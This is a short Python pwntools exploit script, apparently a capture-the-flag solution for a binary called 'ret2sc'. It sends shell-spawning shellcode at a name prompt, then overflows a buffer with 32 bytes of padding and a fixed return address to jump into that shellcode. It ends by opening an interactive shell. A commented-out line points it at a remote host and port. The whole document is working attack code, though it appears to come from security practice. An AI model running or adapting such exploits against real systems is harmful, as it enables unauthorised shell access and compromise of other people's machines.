from pwn import *

ret=0x0804A060
# conn=remote("10.131.1.19",60014)
conn=process("./ret2sc")
conn.sendlineafter("Name:",asm(shellcraft.sh()))
payload="a"*(0x20)+p32(ret)
pause()
conn.sendlineafter("Try your best:",payload)
conn.interactive()
